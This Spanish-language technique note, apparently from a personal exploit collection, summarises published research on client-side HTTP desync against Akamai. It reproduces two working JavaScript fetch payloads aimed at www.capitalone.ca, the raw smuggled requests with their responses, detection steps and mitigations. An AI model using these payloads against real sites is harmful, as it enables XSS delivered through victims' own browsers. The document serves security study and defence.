---
clase: protocolo
tech: akamai-csd
cwe: CWE-444
cvss: 8.8 # [derivado] sin CVE para este caso; XSS cacheado en el navegador de la victima
payload: |
  # ADVERTENCIA DE PROCEDENCIA (H1 + CRITICA): el render colapso los saltos de linea.
  # En este caso NO es cosmetico: los bloques contienen comentarios '//', que en una
  # sola linea COMENTAN EL RESTO DEL BLOQUE. El JS de abajo, tal como lo imprime la
  # fuente, NO SE EJECUTA. Hay que restaurar los saltos de linea. Los '\r\n' DENTRO de
  # los literales de cadena si son fiables: son escapes, no saltos reales.
  #
  # ETAPA 1 - confirmar el desync. JS LITERAL de la fuente:
  fetch('https://www.capitalone.ca/assets', {method: 'POST', body: "GET /robots.txt HTTP/1.1\r\nX: Y", mode: 'no-cors', credentials: 'include'} )
  #
  # Peticion resultante, LITERAL de la fuente (cuerpo de 30 bytes, como declara):
  POST /assets HTTP/1.1
  Host: www.capitalone.ca
  Content-Length: 30

  GET /robots.txt HTTP/1.1
  X: YGET /assets/ HTTP/1.1
  Host: www.capitalone.ca
  #   -> HTTP/1.1 301 Moved Permanently
  #      Location: /assets/
  #      HTTP/1.1 200 OK
  #      Allow: /
  #
  # ETAPA 2 - exploit final con HEAD apilado. JS LITERAL de la fuente:
  fetch('https://www.capitalone.ca/assets', {       method: 'POST',          // use a cache-buster to delay the response       body: `HEAD /404/?cb=${Date.now()} HTTP/1.1\r\nHost: www.capitalone.ca\r\n\r\nGET /x?x=<script>alert(1)</script> HTTP/1.1\r\nX: Y`,       credentials: 'include',       mode: 'cors' // throw an error instead of following redirect   }).catch(() => {       location = 'https://www.capitalone.ca/'   })
  #
  # Peticion resultante, LITERAL:
  POST /assets HTTP/1.1
  Host: www.capitalone.ca
  Content-Length: 67

  HEAD /404/?cb=123 HTTP/1.1

  GET /x?<script>evil() HTTP/1.1
  X: YGET / HTTP/1.1
  Host: www.capitalone.ca
  #   -> HTTP/1.1 301 Moved Permanently   Location: /assets/
  #      HTTP/1.1 404 Not Found   Content-Type: text/html   Content-Length: 432837
  #      HTTP/1.1 301 Moved Permanently   Location: /x/?<script>evil()
precondicion: "Akamai IGNORA el Content-Length en las respuestas de redireccion: un POST a /assets devuelve 301 a /assets/ sin leer el cuerpo. Eso deja el cuerpo en la conexion como peticion nueva. Lo decisivo de la clase: la peticion la emite EL NAVEGADOR DE LA VICTIMA, asi que no hace falta un cliente a medida ni una arquitectura front-end/back-end."
como_se_descubre: |
  Precondicion LITERAL de la fuente para CL.0 explotable por navegador: 'the server
  must ignore the request's Content-Length (CL). This typically happens because the
  request either triggered a server error, or the server simply wasn't expecting a POST
  request to the chosen endpoint.'
  Donde buscar, LITERAL: 'Try targeting static files and server-level redirects, and
  triggering errors via overlong-URLs, and semi-malformed ones like /%2e%2e.'
  Los dos detalles de 'fetch' que la fuente explica y que deciden si funciona:
  - mode: 'no-cors'    -> hace que Chrome muestre el ID de conexion
  - credentials: 'include' -> envenena el pool 'with-cookies', que es el que usan las
    navegaciones. Sin esto el desync ocurre en el pool equivocado y no afecta a nada.
  En la etapa 2 usa mode: 'cors' A PROPOSITO, para que lance un error en lugar de
  seguir la redireccion, y continuar en catch().
control_negativo: |
  # Secuencia de deteccion LITERAL de la fuente (4 pasos), que ES el control:
  # 1. POST con CL sobredimensionado y cuerpo corto -> ¿responde sin esperar el cuerpo?
  #    ADVERTENCIA de la fuente: 'some secure servers respond without waiting for the
  #    body', asi que este paso da FALSOS POSITIVOS por si solo.
  # 2. DOS peticiones en UNA conexion, con prefijo en el cuerpo de la primera
  #    -> la SEGUNDA respuesta debe ser 404 en lugar de 200
  # 3. ALTERAR el cuerpo y confirmar que la segunda respuesta CAMBIA en consecuencia
  # 4. Comprobar soporte de HTTP/2 ('CSD attacks typically exploit HTTP/1.1 connection
  #    reuse')
  # El paso 3 es el que convierte el hallazgo en concluyente: que la segunda respuesta
  # SIGA al cuerpo descarta que sea un comportamiento fijo del servidor.
  # Herramientas: en Burp, 'Send Sequence over Single Connection'. En Turbo Intruder,
  # desactivar pipelining con concurrentConnections=1 y requestsPerConnection=100.
mata: |
  - El servidor respeta el Content-Length en las redirecciones -> muere.
  - HTTP/2 extremo a extremo: la fuente dice que mitiga los ataques CSD.
  - El paso 3 del control no cambia con el cuerpo -> es comportamiento fijo, no desync.
  - Akamai ya lo corrigio (la fuente dice: reportado 2021-11-03, 'I'm not sure when it
    was fixed').
  - FALSO POSITIVO conocido de la fuente: Citrix Web VPN 'simply issued two HTTP
    responses for each request sent to a certain endpoint'. Dos respuestas no son
    siempre un desync.
fuente: "https://portswigger.net/research/browser-powered-desync-attacks (James Kettle, publicado 2022-08-10, act. 2025-09-03). Presentado en Black Hat USA 2022 y DEF CON 30. JS, peticiones y precondiciones literales. Akamai: reportado 2021-11-03, sin CVE para este caso, sin recompensa indicada. Capital One nombrado como el objetivo del ejemplo."
confianza: media
fecha: 2026-11-02
---
# [PROTOCOLO] Client-side desync en Akamai — el navegador de la víctima envía el ataque

## Principio
El desync clásico envenena la conexión entre un front-end y un back-end, así que —en
palabras de la fuente— es *"impossible on websites that don't use a front-end/back-end
architecture"*. El client-side desync mueve el punto de desincronización: ocurre **entre
el navegador y el front-end**, lo que pone en alcance los sitios de un solo servidor.

Y la consecuencia táctica es mayor: el ataque usa peticiones que **un navegador puede
emitir por sí mismo**. No hace falta un cliente a medida. Basta que la víctima visite una
página.

## Payload
Etapa 1, confirmar el desync:

```javascript
fetch('https://www.capitalone.ca/assets', {method: 'POST', body: "GET /robots.txt HTTP/1.1\r\nX: Y", mode: 'no-cors', credentials: 'include'} )
```

Etapa 2, el exploit con `HEAD` apilado:

```javascript
fetch('https://www.capitalone.ca/assets', {       method: 'POST',          // use a cache-buster to delay the response       body: `HEAD /404/?cb=${Date.now()} HTTP/1.1\r\nHost: www.capitalone.ca\r\n\r\nGET /x?x=<script>alert(1)</script> HTTP/1.1\r\nX: Y`,       credentials: 'include',       mode: 'cors' // throw an error instead of following redirect   }).catch(() => {       location = 'https://www.capitalone.ca/'   })
```

## Advertencia crítica sobre este payload
El render de la fuente colapsa los saltos de línea, y aquí **no es cosmético**: los
bloques contienen comentarios `//`, que en una sola línea comentan todo lo que sigue.
El JavaScript tal como aparece arriba **no se ejecuta**. Hay que restaurar los saltos.

Lo que sí es fiable son los `\r\n` **dentro** de los literales de cadena: son secuencias
de escape, no saltos reales, así que sobreviven a la conversión intactos. Y son justo la
parte que importa para el desync.

## Las tres opciones de `fetch` no son adorno
- `mode: 'no-cors'` hace que Chrome muestre el ID de conexión, necesario para verificar.
- `credentials: 'include'` envenena el pool **with-cookies**, que es el que usan las
  navegaciones. Sin esto el desync ocurre en el pool equivocado y no afecta a nada.
- En la etapa 2, `mode: 'cors'` se usa **a propósito** para que lance error en lugar de
  seguir la redirección, y continuar en `catch()`.

Entender para qué está cada una es lo que distingue copiar el payload de poder adaptarlo.

## El paso de detección que decide
La secuencia de la fuente tiene cuatro pasos, y el tercero es el concluyente: **alterar
el cuerpo y confirmar que la segunda respuesta cambia en consecuencia**. El primer paso
—responder sin esperar el cuerpo— da falsos positivos, y la propia fuente lo advierte:
*"some secure servers respond without waiting for the body."*

La fuente documenta además un falso positivo real: Citrix Web VPN *"simply issued two
HTTP responses for each request sent to a certain endpoint"*. Dos respuestas no son
siempre un desync.

## Impacto
XSS entregado a través de la propia conexión del navegador de la víctima, con el payload
cacheado del lado cliente. Y como el vector es una visita a una página cualquiera, no
requiere que la víctima haga nada más.

## Remediación
Cita literal: *"You can mitigate most of the attacks described in this paper by using
HTTP/2 end to end."* Con la advertencia de no quedarse a medias: un front-end que acepte
HTTP/2 y reescriba a HTTP/1.1 upstream *"does mitigate client-side desync attacks, but it
fails to mitigate server-side pause-based attacks and also introduces additional
threats."*

Y para quien implemente un servidor HTTP: *"Treat HTTP requests as individual entities -
don't assume two requests sent down the same connection have anything in common"*,
*"Never assume a request won't have a body"*, y *"Default to discarding the connection if
you encounter any server-level exceptions while handling a request."*
